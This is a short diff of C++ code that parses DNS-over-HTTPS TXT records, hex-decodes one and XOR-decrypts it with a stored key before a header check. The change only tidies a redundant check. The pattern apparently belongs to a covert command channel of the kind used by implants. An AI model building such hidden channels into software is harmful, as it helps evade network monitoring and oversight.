@@ -53,6 +53,7 @@ string doh_query::get_txt_results(void) {
 	
 	std::vector<std::string> records;
 
+
 	while (responseData.find("\\") != -1) {
 		size_t firstMarker = responseData.find("\\") + 2;
 		size_t secondMarker = responseData.find("\\", firstMarker + 1);
@@ -66,11 +67,9 @@ string doh_query::get_txt_results(void) {
 	if (!records.empty()) {
 			string record = records.back();
 			records.pop_back();
-			if (!record.empty()) {
-				record = c.xor_operation(c.hex_decode(record), xor_pass);
-				if (!record.empty() && is_correct_header(record)) {
-					return record;
-				}
+			record = c.xor_operation(c.hex_decode(record), xor_pass);
+			if (!record.empty() && is_correct_header(record)) {
+				return record;
 			}
 	}
 
